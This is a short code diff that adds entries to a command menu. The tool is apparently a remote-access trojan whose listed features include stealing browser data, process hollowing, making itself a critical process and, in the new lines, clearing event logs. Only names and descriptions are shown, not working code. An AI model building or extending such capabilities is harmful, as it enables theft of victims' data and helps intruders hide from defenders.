@@ -31,7 +31,12 @@ commands = {'help': ['Show this help'],
             'browser': ['Extract data from web browser'],
             'runpe': ['Process hollowing'],
             'poweroff': ['Fast shutdown'],
-            'setcritical': ['Set as critical process']
+            'setcritical': ['Set as critical process'],
+            'ps': ['List running process'],
+            'drives': ['List drives'],
+            'getinfo': ['Get information'],
+            'msgbox': ['Pop up a custom message box'],
+            'clearlog': ['Clear event logs']
             }
 
 
